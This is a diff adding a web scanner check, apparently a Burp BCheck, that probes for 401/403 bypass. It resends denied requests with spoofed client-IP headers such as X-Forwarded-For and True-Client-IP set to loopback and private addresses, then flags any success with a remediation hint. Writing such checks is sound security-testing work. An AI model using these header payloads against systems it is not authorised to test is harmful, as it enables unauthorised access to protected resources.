@@ -1,0 +1,47 @@
+# 401/403 Bypass - IP Header Injection
+# Tests bypass using X-Forwarded-For, X-Real-IP, and similar headers
+
+metadata:
+    language: v2-beta
+    name: "403/401 Bypass - IP Headers"
+    description: "Attempts to bypass 401/403 using IP-based header injection"
+    author: "Combined (nomore403 + BypassFuzzer)"
+    tags: "bypass", "403", "401", "ip-header", "active"
+
+define:
+    desc = "Potential 401/403 bypass via IP header injection"
+    reme = "Ensure access control is not based on client-provided IP headers"
+
+run for each:
+    bypass_ip =
+        "127.0.0.1",
+        "localhost",
+        "0.0.0.0",
+        "::1",
+        "10.0.0.1",
+        "172.16.0.1",
+        "192.168.1.1"
+
+    bypass_header =
+        "X-Forwarded-For",
+        "X-Real-IP",
+        "X-Client-IP",
+        "X-Originating-IP",
+        "True-Client-IP",
+        "CF-Connecting-IP",
+        "X-Custom-IP-Authorization"
+
+given request then
+    if {base.response.status_code} matches "(401|403)" then
+        send request:
+            replacing headers:
+                {bypass_header}: {bypass_ip}
+
+        if {latest.response.status_code} matches "^[23]" then
+            report issue:
+                severity: high
+                confidence: tentative
+                detail: `{desc}. Header: {bypass_header}: {bypass_ip}. Status: {base.response.status_code} -> {latest.response.status_code}`
+                remediation: {reme}
+        end if
+    end if
